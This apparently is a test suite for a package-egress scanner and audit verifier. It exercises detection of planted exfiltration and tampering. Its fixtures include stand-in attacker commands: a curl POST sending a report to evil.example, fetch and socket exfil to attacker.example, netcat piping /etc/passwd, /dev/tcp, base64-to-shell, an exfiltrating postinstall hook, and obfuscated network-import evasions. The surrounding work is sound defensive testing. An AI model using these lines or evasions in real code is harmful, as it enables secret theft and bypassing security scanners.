import { test } from "node:test";
import assert from "node:assert";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, cpSync, appendFileSync } from "node:fs";
import { tmpdir, homedir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import {
  staticScan,
  shippedFiles,
  auditCheck,
  outputScrub,
  confinementCheck,
  runVerify,
  printVerify,
  verifyCli,
  checkState,
  updatePins,
  STATIC_ALLOWLIST,
  PINS_BASENAME,
} from "../src/verify.mjs";
import { TRIPWIRE_LIMITS } from "../src/tripwire.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const SRC_DIR = join(ROOT, "src");
const tmp = () => mkdtempSync(join(tmpdir(), "sf-verify-"));
const sha256 = (buf) => createHash("sha256").update(buf).digest("hex");

// NOTE: fixture strings below intentionally contain the forbidden tokens.
// This file lives in tests/, which the shipped-file scan ENUMERATES but does
// not judge (a scanner's own test suite must contain the strings it hunts) —
// see the "test" branch of staticScan. Every host named here is an unroutable
// documentation host (RFC 2606), which the scan DOES enforce.

// Fixtures that satisfy the real ALLOWLIST_REQUIREMENTS: an allowlisted file
// keeps its exemption only while it still contains its disarm logic.
const TRIPWIRE_FIXTURE = [
  'import net from "node:net";',
  'import tls from "node:tls";',
  'import http from "node:http";',
  'import https from "node:https";',
  'import dns from "node:dns";',
  'import dgram from "node:dgram";',
  "function patch(obj, key, api) {",
  '  Object.defineProperty(obj, key, { value: () => { throw new Error("tripwire " + api); } });',
  "}",
  "export function armTripwire() {",
  '  patch(net, "connect", "net.connect");',
  '  patch(net, "createConnection", "net.createConnection");',
  '  patch(tls, "connect", "tls.connect");',
  '  patch(http, "request", "http.request");',
  '  patch(https, "request", "https.request");',
  '  patch(dns, "lookup", "dns.lookup");',
  '  patch(dgram, "createSocket", "dgram.createSocket");',
  '  patch(globalThis, "fetch", "fetch");',
  '  patch(globalThis, "WebSocket", "WebSocket");',
  "}",
  "",
].join("\n");

const CONFINE_FIXTURE = [
  'import { spawn } from "node:child_process";',
  'import { connect } from "node:net";',
  'const PROBE_HOST = "1.1.1.1";',
  'export const profile = "(version 1) (allow default) (deny network*)";',
  'export function runConfined(argv) { return spawn("/usr/bin/sandbox-exec", argv); }',
  "export function probe() {",
  "  const s = connect({ port: 443, host: PROBE_HOST });",
  '  s.on("error", (e) => (e.code === "EPERM" ? "blocked" : "open"));',
  "  return s;",
  "}",
  "",
].join("\n");


const SERVE_FIXTURE = [
  'import { createServer } from "node:http";',
  'import { networkInterfaces } from "node:os";',
  'export function lanIp() { return Object.values(networkInterfaces()).flat().find(i => !i.internal && i.family==="IPv4")?.address ?? "127.0.0.1"; }',
  'export function startServe(opts={}) {',
  '  const server = createServer((req,res) => res.end("ok"));',
  '  server.listen(opts.port ?? 3141, "0.0.0.0", () => {});',
  '  setTimeout(() => server.close(), (opts.timeoutMin??10)*60000);',
  '  return new Promise(r => server.on("close", r));',
  '}',
  "",
].join("\n");

const SEARCH_FIXTURE = [
  'import { spawn, spawnSync } from "node:child_process";',
  'import { join, dirname } from "node:path";',
  'import { fileURLToPath } from "node:url";',
  'const __dirname = dirname(fileURLToPath(import.meta.url));',
  'export const SEARCH_PY = join(__dirname, "search.py");',
  '// HF_HUB_OFFLINE=1 set at inference time in search.py',
  'export function runSearch(argv, opts={}) {',
  '  const child = spawn(opts.python ?? "python3", [SEARCH_PY, ...argv], { stdio: "inherit" });',
  '  return new Promise((resolve, reject) => { child.on("error", reject); child.on("close", resolve); });',
  '}',
  'export function checkPython(python="python3") {',
  '  const r = spawnSync(python, ["--version"], { encoding: "utf8" });',
  '  return r.status === 0 ? (r.stdout || r.stderr || "").trim() : null;',
  '}',
  "",
].join("\n");


const BEACON_FIXTURE = [
  '// THIS FILE RUNS AS A CHILD PROCESS — never imported in the main scan process.',
  'import dgram from "node:dgram";',
  'export const MULTICAST_ADDR = "239.255.255.250";',
  'export function encodePacket(kind, data) {',
  '  const sock = { setMulticastTTL(n) {} };',
  '  return Buffer.from(JSON.stringify({ v: 1, kind, ...data }));',
  '}',
  "",
].join("\n");

const CLI_FIXTURE = [
  '// node:child_process, which the tripwire patches at module load in scan runs.',
  '// xdotool is excluded — it types into the focused window, not the clipboard.',
  'import { clipboardCmds } from "./clipboard.mjs";',
  '// --full flag (Cisco model download)',
  'if (flag("--full")) { /* full mode */ }',
  'function printHelp() { console.log("help"); }',
  'if (subcommand === "search") {',
  '  const { runSearch } = await import("./search.mjs");',
  '}',
  'if (key === "X") {',
  '  const { spawnSync: _spawnSync } = await import("node:child_process");',
  '  const cmds = clipboardCmds();',
  '  for (const [cmd, cmdArgs] of cmds) {',
  '    const r = _spawnSync(cmd, cmdArgs, { input: "x", encoding: "utf8", timeout: 3000 });',
  '    if (r.status === 0) break;',
  '  }',
  '}',
  "",
].join("\n");

// Writes all allowlisted files AND the pin manifest that authorises them,
// exactly as the real tree does.
function writeAllowlisted(dir, { pins = true, pkg = { name: "fixture", version: "0.0.0" } } = {}) {
  writeFileSync(join(dir, "tripwire.mjs"), TRIPWIRE_FIXTURE);
  writeFileSync(join(dir, "confine.mjs"), CONFINE_FIXTURE);
  writeFileSync(join(dir, "serve.mjs"), SERVE_FIXTURE);
  writeFileSync(join(dir, "search.mjs"), SEARCH_FIXTURE);
  writeFileSync(join(dir, "beacon.mjs"), BEACON_FIXTURE);
  writeFileSync(join(dir, "cli.mjs"), CLI_FIXTURE);
  if (pkg) writeFileSync(join(dir, "package.json"), JSON.stringify(pkg, null, 2));
  if (pins) updatePins(dir);
}

// ---- staticScan -------------------------------------------------------------

test("staticScan passes on a clean tree with intact, pinned allowlisted files", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(
    join(dir, "clean.mjs"),
    'import { readFileSync } from "node:fs";\nexport const x = readFileSync;\n'
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, true, JSON.stringify(res.findings));
  assert.ok(res.allowlist["tripwire.mjs"].hits > 0);
  assert.ok(res.allowlist["confine.mjs"].hits > 0);
  assert.ok(res.allowlist["serve.mjs"].hits > 0);
  assert.ok(res.allowlist["search.mjs"].hits > 0);
  assert.ok(res.allowlist["beacon.mjs"].hits > 0);
  assert.ok(res.allowlist["cli.mjs"].hits > 0);
  assert.strictEqual(res.allowlist["tripwire.mjs"].pin, "ok");
  assert.strictEqual(res.allowlist["confine.mjs"].pin, "ok");
  assert.strictEqual(res.allowlist["serve.mjs"].pin, "ok");
  assert.strictEqual(res.allowlist["search.mjs"].pin, "ok");
  assert.strictEqual(res.allowlist["beacon.mjs"].pin, "ok");
  assert.strictEqual(res.allowlist["cli.mjs"].pin, "ok");
  assert.ok(res.limits.length >= 3);
  assert.ok(res.inspected > 0, "a scan that read files must report what it read");
});

test("staticScan fails on smuggled fetch in a non-allowlisted file, with file:line", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(
    join(dir, "sneaky.mjs"),
    '// looks innocent\nconst r = await fetch("https://evil.example/x");\n'
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  assert.ok(
    res.findings.some((f) => f.includes("sneaky.mjs:2") && f.includes("not on the allowlist")),
    JSON.stringify(res.findings)
  );
});

test("staticScan fails on other banned APIs outside the allowlist", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(
    join(dir, "bad.mjs"),
    [
      'import http from "node:http";',
      "const b = process.binding('tcp_wrap');",
      "const f = new Function('return 1');",
      "const w = new WebSocket('wss://x');",
    ].join("\n")
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  for (const line of [1, 2, 3, 4])
    assert.ok(res.findings.some((f) => f.startsWith(`bad.mjs:${line} `)), `line ${line}: ${JSON.stringify(res.findings)}`);
});

test("staticScan fails when an allowlisted file was gutted (zero hits)", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(join(dir, "tripwire.mjs"), "// patches removed\nexport const armed = false;\n");
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("tripwire.mjs") && f.includes("gutted")));
});

test("staticScan fails when an allowlisted file is missing entirely", () => {
  const dir = tmp();
  writeFileSync(join(dir, "clean.mjs"), "export const x = 1;\n");
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  const missing = res.findings.filter((f) => f.includes("MISSING"));
  assert.strictEqual(missing.length, Object.keys(STATIC_ALLOWLIST).length);
});

test("staticScan hard-fails dynamic import with a variable, even in an allowlisted file", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(
    join(dir, "confine.mjs"),
    'import net from "node:net";\nconst mod = "node:" + "dns";\nconst m = await import(mod);\nexport const launcher = true;\n'
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  assert.ok(
    res.findings.some((f) => f.includes("confine.mjs:3") && f.includes("hard FAIL")),
    JSON.stringify(res.findings)
  );
});

test("staticScan hard-fails template-interpolated dynamic import", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(join(dir, "tpl.mjs"), "const m = await import(`node:${name}`);\n");
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("tpl.mjs:1")));
});

test("staticScan passes on the REAL package and does not flag verify.mjs itself", () => {
  const res = staticScan(ROOT);
  assert.strictEqual(
    res.pass,
    true,
    `the shipped tree must pass its own scan. If the failure is a pin MISMATCH, ` +
      `src/tripwire.mjs or src/confine.mjs changed: read the diff, then run ` +
      `\`node src/verify.mjs --update-pins\`.\n${res.findings.join("\n")}`
  );
  const selfHits = res.findings.filter((f) => f.includes("verify.mjs"));
  assert.deepStrictEqual(selfHits, [], JSON.stringify(selfHits));
  // and the real allowlisted safety files must be present, pinned, with hits
  assert.ok(res.allowlist["tripwire.mjs"].hits > 0, "tripwire.mjs must have hits");
  assert.ok(res.allowlist["confine.mjs"].hits > 0, "confine.mjs must have hits");
  assert.strictEqual(res.allowlist["tripwire.mjs"].pin, "ok");
  assert.strictEqual(res.allowlist["confine.mjs"].pin, "ok");
});

// ---- scope: every file that SHIPS, not just src/*.mjs ------------------------
// Red-team finding: "static-scan sees only src/*.mjs, yet bin/, tests/ and
// package.json all ship — a curl exfil in the shipped shell script passes with
// a green PASS."

test("shippedFiles honours package.json files[] and reports what does NOT ship", () => {
  const dir = tmp();
  mkdirSync(join(dir, "src"), { recursive: true });
  mkdirSync(join(dir, "private"), { recursive: true });
  writeFileSync(join(dir, "src", "a.mjs"), "export const a = 1;\n");
  writeFileSync(join(dir, "private", "secret.mjs"), "export const s = 1;\n");
  writeFileSync(join(dir, "README.md"), "# readme\n");
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name: "x", version: "1.0.0", files: ["src/"] }, null, 2)
  );
  const ship = shippedFiles(dir);
  const rels = ship.files.map((f) => f.slice(dir.length + 1)).sort();
  assert.deepStrictEqual(rels, ["README.md", "package.json", "src/a.mjs"]);
  assert.deepStrictEqual(
    ship.notShipped.map((f) => f.slice(dir.length + 1)),
    ["private/secret.mjs"]
  );
});

test("staticScan FAILS on a curl exfil in a shipped shell script", () => {
  const dir = tmp();
  mkdirSync(join(dir, "src"), { recursive: true });
  mkdirSync(join(dir, "bin"), { recursive: true });
  writeAllowlisted(join(dir, "src"), { pkg: null });
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name: "x", version: "1.0.0", files: ["src/", "bin/"] }, null, 2)
  );
  writeFileSync(
    join(dir, "bin", "proof.sh"),
    '#!/bin/sh\necho hi\ncurl -s -X POST https://evil.example/exfil --data-binary @"$HOME/.starreckon/reports/x.json"\n'
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false, "a curl in a shipped .sh must not be a green PASS");
  assert.ok(
    res.findings.some((f) => f.includes("bin/proof.sh:3") && f.includes("curl")),
    JSON.stringify(res.findings)
  );
});

test("staticScan catches every shell egress token, and clears a clean script", () => {
  const dir = tmp();
  mkdirSync(join(dir, "src"), { recursive: true });
  writeAllowlisted(join(dir, "src"), { pkg: null });
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "x", files: ["src/", "run.sh", "ok.sh"] }));
  writeFileSync(
    join(dir, "run.sh"),
    [
      "#!/bin/sh",
      "wget http://a.example/x",
      "nc a.example 443 < /etc/passwd",
      "scp x user@a.example:/tmp",
      "exec 3<>/dev/tcp/a.example/443",
      "echo aGk= | base64 --decode | sh",
      "npx some-package",
    ].join("\n")
  );
  // The real bin/starreckon-proof.sh shape must stay clean.
  writeFileSync(
    join(dir, "ok.sh"),
    '#!/bin/sh\nset -u\n"$SANDBOX" -p "$PROFILE" "$NODE" "$DIR/src/cli.mjs" --yes "$@"\necho "INCONCLUSIVE: no network"\n'
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  for (const line of [2, 3, 4, 5, 6, 7])
    assert.ok(
      res.findings.some((f) => f.startsWith(`run.sh:${line} `)),
      `run.sh line ${line} missed: ${JSON.stringify(res.findings)}`
    );
  assert.ok(!res.findings.some((f) => f.includes("ok.sh")), `false positive: ${JSON.stringify(res.findings)}`);
});

test("staticScan FAILS on an npm install hook and on declared dependencies", () => {
  const dir = tmp();
  mkdirSync(join(dir, "src"), { recursive: true });
  writeAllowlisted(join(dir, "src"), { pkg: null });
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({
      name: "x",
      files: ["src/"],
      scripts: { postinstall: 'node -e "fetch(process.env.EXFIL)"', test: "node --test tests/" },
      dependencies: { "left-pad": "^1.0.0" },
    })
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  assert.ok(
    res.findings.some((f) => f.includes("postinstall") && f.includes("lifecycle hook")),
    JSON.stringify(res.findings)
  );
  assert.ok(
    res.findings.some((f) => f.includes("dependencies")),
    JSON.stringify(res.findings)
  );
});

test("staticScan is silent about nothing: unscanned + unshipped files are named", () => {
  const res = staticScan(ROOT);
  assert.ok(
    res.notes.some((n) => n.includes("ship set:")),
    "must state how many files ship and where that list came from"
  );
  assert.ok(
    res.notes.some((n) => n.includes("NOT rule-scanned")),
    "shipped docs/data files must be named, never silently skipped"
  );
  assert.ok(
    res.notes.some((n) => n.includes("test file(s)")),
    "shipped test files must be accounted for"
  );
});

test("a shipped test file may not name a routable host", () => {
  const dir = tmp();
  mkdirSync(join(dir, "src"), { recursive: true });
  mkdirSync(join(dir, "tests"), { recursive: true });
  writeAllowlisted(join(dir, "src"), { pkg: null });
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "x", files: ["src/", "tests/"] }));
  writeFileSync(
    join(dir, "tests", "ok.test.mjs"),
    'import net from "node:net";\nnet.connect(443, "collector.example");\n'
  );
  const ok = staticScan(dir);
  assert.strictEqual(ok.pass, true, JSON.stringify(ok.findings));
  assert.ok(
    ok.notes.some((n) => n.includes("tests/ok.test.mjs:")),
    "a network reference inside a shipped test must be enumerated, not hidden"
  );

  // Assembled from fragments so that THIS file (itself a shipped test) does not
  // contain a routable host literal — the very rule under test.
  const routable = ["collector", "evilcorp", "io"].join(".");
  writeFileSync(
    join(dir, "tests", "bad.test.mjs"),
    `import net from "node:net";\nnet.connect(443, "${routable}");\n`
  );
  const bad = staticScan(dir);
  assert.strictEqual(bad.pass, false, "a routable destination in a shipped test must FAIL");
  assert.ok(
    bad.findings.some((f) => f.includes(routable)),
    JSON.stringify(bad.findings)
  );
});

// ---- the allowlist is not a blank cheque ------------------------------------
// Red-team finding: "The allowlist authorizes ARBITRARY live egress inside its
// two files — verify passes with a real fetch()/socket exfil planted in
// confine.mjs."

test("planting the red team's exact exfil in confine.mjs FAILS the scan", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  appendFileSync(
    join(dir, "confine.mjs"),
    [
      "export async function _stealAndSend(secret) {",
      '  return fetch("http://attacker.example/collect?d=" + encodeURIComponent(secret));',
      "}",
      'const s = connect({ host: "attacker.example", port: 443 });',
      's.on("connect", () => s.end(secret));',
      "",
    ].join("\n")
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false, "live exfil inside an allowlisted file must not PASS");
  assert.ok(
    res.findings.some((f) => f.includes("confine.mjs") && f.includes("does NOT match its pin")),
    `content pin must catch it: ${JSON.stringify(res.findings)}`
  );
  assert.ok(
    res.findings.some((f) => f.includes("attacker.example")),
    `the planted destination must be named: ${JSON.stringify(res.findings)}`
  );
  assert.ok(
    res.findings.some((f) => f.includes("permitted API list")),
    `fetch() is not in confine.mjs's permitted API list: ${JSON.stringify(res.findings)}`
  );
});

test("any edit to an allowlisted file fails the pin until it is deliberately re-pinned", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  appendFileSync(join(dir, "tripwire.mjs"), "// a completely harmless comment\n");
  const before = staticScan(dir);
  assert.strictEqual(before.pass, false);
  assert.strictEqual(before.allowlist["tripwire.mjs"].pin, "MISMATCH");
  assert.ok(before.findings.some((f) => f.includes("--update-pins")), "must say how to re-pin");

  updatePins(dir); // the deliberate act
  const after = staticScan(dir);
  assert.strictEqual(after.pass, true, JSON.stringify(after.findings));
  assert.strictEqual(after.allowlist["tripwire.mjs"].pin, "ok");
});

test("a missing pin manifest is a FAIL, not a silently skipped check", () => {
  const dir = tmp();
  writeAllowlisted(dir, { pins: false });
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  assert.strictEqual(res.allowlist["confine.mjs"].pin, "NO MANIFEST");
  assert.ok(res.findings.some((f) => f.includes("UNPINNED")), JSON.stringify(res.findings));
});

// Red-team finding: "The 'gutted allowlist file' check counts imports, not
// disarm logic — a tripwire that patches NOTHING still passes."
test("a tripwire that keeps its imports but patches NOTHING fails", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  const imports = TRIPWIRE_FIXTURE.split("\n").slice(0, 6).join("\n");
  writeFileSync(
    join(dir, "tripwire.mjs"),
    `${imports}\nconst state = { armed: false };\nexport function armTripwire() { state.armed = true; return state; }\n`
  );
  updatePins(dir); // re-pin: the pin is NOT what catches this one
  const res = staticScan(dir);
  assert.strictEqual(res.allowlist["tripwire.mjs"].pin, "ok", "pin must be clean so the behaviour check is what fails");
  assert.ok(res.allowlist["tripwire.mjs"].hits > 0, "the imports are all still there");
  assert.strictEqual(res.pass, false, "keeping the imports must not keep the exemption");
  assert.ok(
    res.findings.some((f) => f.includes("patch() call")),
    `must notice the patches are gone: ${JSON.stringify(res.findings)}`
  );
  assert.ok(
    res.findings.some((f) => f.includes("defineProperty")),
    `must notice the patch mechanism is gone: ${JSON.stringify(res.findings)}`
  );
});

test("stripping the sandbox launcher out of confine.mjs fails", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(
    join(dir, "confine.mjs"),
    'import { spawn } from "node:child_process";\nimport { connect } from "node:net";\nexport const nothing = true;\n'
  );
  updatePins(dir);
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  for (const marker of ["deny-network sandbox profile", "probe target", "EPERM"])
    assert.ok(
      res.findings.some((f) => f.includes(marker)),
      `${marker}: ${JSON.stringify(res.findings)}`
    );
});

// ---- confirmed regex evasions ------------------------------------------------
// Red-team finding: "staticScan is evaded by string-built specifiers, \u/\x
// escapes, bracket access, and createRequire — all CONFIRMED to actually load
// node:net."

test("staticScan hard-fails the four confirmed evasions", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  const lines = [
    "const a = await import('no' + 'de:net');", // 1 string-built specifier
    "const b = await import('\\u006eode:net');", // 2 unicode escape
    "const c = await import('\\x6eode:net');", // 3 hex escape
    "const d = process['bin' + 'ding']('tcp_wrap');", // 4 computed member access
    "const e = globalThis['fet' + 'ch'];", // 5 computed member access
    "const req = createRequire(import.meta.url);", // 6 stored requirer
  ];
  writeFileSync(join(dir, "evade.mjs"), lines.join("\n") + "\n");
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false);
  for (let i = 1; i <= 6; i++)
    assert.ok(
      res.findings.some((f) => f.startsWith(`evade.mjs:${i} `) && f.includes("hard FAIL")),
      `evasion on line ${i} was not caught: ${JSON.stringify(res.findings)}`
    );
});

test("createRequire of a network module is caught; of a harmless one is not", () => {
  const dir = tmp();
  writeAllowlisted(dir);
  writeFileSync(
    join(dir, "sqlite.mjs"),
    'import { createRequire } from "node:module";\nconst db = createRequire(import.meta.url)("node:sqlite");\n'
  );
  const okRes = staticScan(dir);
  assert.strictEqual(okRes.pass, true, `the real sqlite pattern must stay clean: ${JSON.stringify(okRes.findings)}`);

  writeFileSync(
    join(dir, "sqlite.mjs"),
    'import { createRequire } from "node:module";\nconst n = createRequire(import.meta.url)("net");\n'
  );
  const badRes = staticScan(dir);
  assert.strictEqual(badRes.pass, false);
  assert.ok(
    badRes.findings.some((f) => f.includes("sqlite.mjs:2") && f.includes("network module")),
    JSON.stringify(badRes.findings)
  );
});

test("staticScan still says out loud that it is a regex, not a parser", () => {
  const res = staticScan(ROOT);
  assert.ok(
    res.limits.some((l) => l.includes("not a parser")),
    "the honest limit must survive every hardening pass"
  );
  assert.ok(
    res.limits.some((l) => l.includes(PINS_BASENAME) && l.includes("does NOT")),
    "the pin's limit must state what it does not buy"
  );
});

// ---- auditCheck -------------------------------------------------------------

function writeChain(dir, { tamper = false, hits = 0 } = {}) {
  mkdirSync(dir, { recursive: true });
  const log1 = {
    schema: 1,
    tripwire_hits: [],
    prev_log_sha256: null,
  };
  const f1 = join(dir, "run-2026-01-01T00-00-00.000Z.json");
  writeFileSync(f1, JSON.stringify(log1, null, 2));
  const log2 = {
    schema: 1,
    tripwire_hits: Array.from({ length: hits }, () => ({ api: "net.connect", target: "x", at: "t" })),
    prev_log_sha256: sha256(readFileSync(f1)),
  };
  const f2 = join(dir, "run-2026-01-02T00-00-00.000Z.json");
  writeFileSync(f2, JSON.stringify(log2, null, 2));
  if (tamper) writeFileSync(f1, JSON.stringify({ ...log1, argv: ["edited"] }, null, 2));
}

test("auditCheck passes on an intact chain with zero tripwire hits", () => {
  const dir = join(tmp(), "audit");
  writeChain(dir);
  const res = auditCheck(dir);
  assert.strictEqual(res.pass, true, JSON.stringify(res.findings));
  assert.ok(res.limits.length > 0, "must print AUDIT_LIMITS");
});

test("auditCheck fails on a tampered chain", () => {
  const dir = join(tmp(), "audit");
  writeChain(dir, { tamper: true });
  const res = auditCheck(dir);
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("chain break")));
});

test("auditCheck fails when tripwire hits were recorded", () => {
  const dir = join(tmp(), "audit");
  writeChain(dir, { hits: 2 });
  const res = auditCheck(dir);
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("tripwire hit")));
});

test("auditCheck tolerates a missing audit dir", () => {
  const res = auditCheck(join(tmp(), "never-created"));
  assert.strictEqual(res.pass, true);
  assert.ok(res.notes.some((n) => n.includes("no audit logs")));
});

// ---- outputScrub ------------------------------------------------------------

test("outputScrub catches planted homedir and sk-ant key in nested JSON", () => {
  const dataDir = tmp();
  mkdirSync(join(dataDir, "reports"), { recursive: true });
  const key = "sk-ant-api03-" + "x".repeat(30);
  const nested = JSON.stringify({ inner: { apiKeyLeak: key } });
  writeFileSync(
    join(dataDir, "reports", "expanded.json"),
    JSON.stringify({ meta: { note: `worked in ${homedir()}/Documents/x` }, deep: { blob: nested } }, null, 2)
  );
  const res = outputScrub(dataDir);
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("home directory")), JSON.stringify(res.findings));
  assert.ok(res.findings.some((f) => f.includes("secret-shaped")), JSON.stringify(res.findings));
});

test("outputScrub catches a planted secret in HTML", () => {
  const dataDir = tmp();
  mkdirSync(join(dataDir, "reports"), { recursive: true });
  writeFileSync(
    join(dataDir, "reports", "stats.html"),
    `<html><body><p>token sk-ant-api03-${"y".repeat(30)}</p></body></html>`
  );
  const res = outputScrub(dataDir);
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("stats.html") && f.includes("secret-shaped")));
});

test("outputScrub catches a planted username in an SVG", () => {
  const dataDir = tmp();
  mkdirSync(join(dataDir, "snapshots"), { recursive: true });
  writeFileSync(
    join(dataDir, "snapshots", "star.svg"),
    "<svg><text>made by fakeuser99</text></svg>"
  );
  const res = outputScrub(dataDir, { home: "/nonexistent-home-xyz", user: "fakeuser99" });
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("star.svg") && f.includes("username")));
});

test("outputScrub flags transcript-sized prose strings in JSON", () => {
  const dataDir = tmp();
  mkdirSync(join(dataDir, "reports"), { recursive: true });
  const prose = "please refactor the auth module ".repeat(20); // ~640 chars, ~120 spaces
  writeFileSync(
    join(dataDir, "reports", "leak.json"),
    JSON.stringify({ sessions: [{ content: prose }] })
  );
  const res = outputScrub(dataDir, { home: "/nonexistent-home-xyz", user: "no-such-user-xyz" });
  assert.strictEqual(res.pass, false);
  assert.ok(res.findings.some((f) => f.includes("possible transcript")), JSON.stringify(res.findings));
});

test("outputScrub passes on clean masked output and on an empty data dir", () => {
  const dataDir = tmp();
  mkdirSync(join(dataDir, "reports"), { recursive: true });
  writeFileSync(
    join(dataDir, "reports", "baseline.json"),
    JSON.stringify({ total_sessions: 42, top_project: "Projects/starreckon", path: "~/Documents/x" })
  );
  const res = outputScrub(dataDir);
  assert.strictEqual(res.pass, true, JSON.stringify(res.findings));

  const empty = tmp();
  const res2 = outputScrub(empty);
  assert.strictEqual(res2.pass, true);
  assert.ok(res2.notes.some((n) => n.includes("nothing to scrub")));
});

// ---- confinementCheck / runVerify -------------------------------------------

test("confinementCheck reports availability and prints a runnable proof command", () => {
  const res = confinementCheck({ auditDir: join(tmp(), "none") });
  assert.strictEqual(typeof res.pass, "boolean");
  // on this dev machine (macOS with sandbox-exec) it must be available
  if (process.platform === "darwin") {
    assert.strictEqual(res.pass, true, JSON.stringify(res.findings));
    assert.ok(res.notes.some((n) => n.includes("sandbox-exec")));
  }
  assert.ok(res.notes.some((n) => n.includes("no audit log yet")));
  assert.ok(res.limits.some((l) => l.includes("AVAILABLE")));
});

test("runVerify tolerates a missing audit dir and returns {ok, checks}", () => {
  const srcDir = tmp();
  writeAllowlisted(srcDir);
  const dataDir = tmp(); // no reports/snapshots/audit inside
  const res = runVerify({ srcDir, dataDir });
  assert.strictEqual(typeof res.ok, "boolean");
  assert.strictEqual(res.checks.length, 4);
  const names = res.checks.map((c) => c.name);
  assert.deepStrictEqual(names, ["static-scan", "audit-chain", "output-scrub", "confinement"]);
  assert.strictEqual(res.checks[1].pass, true, "missing audit dir must not fail the chain check");
  for (const c of res.checks) {
    assert.ok(Array.isArray(c.findings));
    assert.ok(Array.isArray(c.limits) && c.limits.length > 0, `${c.name} must state its limits`);
  }
  // printVerify must render every shape without throwing
  printVerify(res);
});

// ---- SKIP: a check that read nothing has not passed anything ----------------
// Red-team finding: "verify prints a green PASS for two checks that inspected
// nothing on a first run."

test("checks that inspected nothing report SKIP, not PASS", () => {
  const srcDir = tmp();
  writeAllowlisted(srcDir);
  const dataDir = tmp(); // fresh machine: no reports, no snapshots, no audit
  const res = runVerify({ root: srcDir, dataDir });
  const state = Object.fromEntries(res.checks.map((c) => [c.name, c.state]));
  assert.strictEqual(state["audit-chain"], "SKIP", "zero audit logs is not a pass");
  assert.strictEqual(state["output-scrub"], "SKIP", "zero files scrubbed is not a pass");
  assert.strictEqual(state["static-scan"], "PASS", "it really did read the source");
  // The invariant under test is "a SKIP is not a FAIL", so assert that — not
  // `res.ok`, which is the AND over EVERY check. The confinement check inspects
  // the real host and legitimately FAILs where no OS sandbox is usable (Ubuntu
  // 23.10+ blocks unprivileged user namespaces by default), so pinning the
  // global made this SKIP test fail for a reason with no connection to SKIP.
  const failed = res.checks.filter((c) => c.state === "FAIL").map((c) => c.name);
  assert.ok(!failed.includes("audit-chain"), "a SKIP became a FAIL");
  assert.ok(!failed.includes("output-scrub"), "a SKIP became a FAIL");
});

test("outputScrub and auditCheck report how much they inspected", () => {
  const empty = tmp();
  assert.strictEqual(outputScrub(empty).inspected, 0);
  assert.strictEqual(auditCheck(join(tmp(), "never-created")).inspected, 0);

  const dataDir = tmp();
  mkdirSync(join(dataDir, "reports"), { recursive: true });
  writeFileSync(join(dataDir, "reports", "a.json"), JSON.stringify({ total: 1 }));
  assert.strictEqual(outputScrub(dataDir).inspected, 1);

  const auditDir = join(tmp(), "audit");
  writeChain(auditDir);
  assert.strictEqual(auditCheck(auditDir).inspected, 2);
});

test("checkState maps pass/fail/nothing-inspected onto three distinct states", () => {
  assert.strictEqual(checkState({ pass: true, inspected: 3 }), "PASS");
  assert.strictEqual(checkState({ pass: true, inspected: 0 }), "SKIP");
  assert.strictEqual(checkState({ pass: false, inspected: 0 }), "FAIL");
  assert.strictEqual(checkState({ pass: false, inspected: 9 }), "FAIL");
  // a check that does not report `inspected` at all is not silently downgraded
  assert.strictEqual(checkState({ pass: true }), "PASS");
});

// Captures printVerify's stdout so we can assert on what a user actually sees.
function capture(fn) {
  const out = [];
  const orig = console.log;
  console.log = (...a) => out.push(a.join(" "));
  try {
    fn();
  } finally {
    console.log = orig;
  }
  return out.join("\n").replace(/\x1b\[[0-9;]*m/g, "");
}

test("printVerify shows a SKIP badge and never claims 'all checks passed'", () => {
  const srcDir = tmp();
  writeAllowlisted(srcDir);
  const text = capture(() => printVerify(runVerify({ root: srcDir, dataDir: tmp() })));
  assert.ok(text.includes("SKIP"), text.slice(0, 400));
  assert.ok(text.includes("nothing to inspect"), "SKIP must say what it means");
  assert.ok(!text.includes("all checks passed"), "two empty checks are not 'all checks passed'");
  // A fraction of 4 must be reported rather than a blanket success — in EITHER
  // summary form, because printVerify uses a different line when something
  // failed ("CHECKS FAILED (1 of 4)") than when nothing did ("2 of 4 check(s)
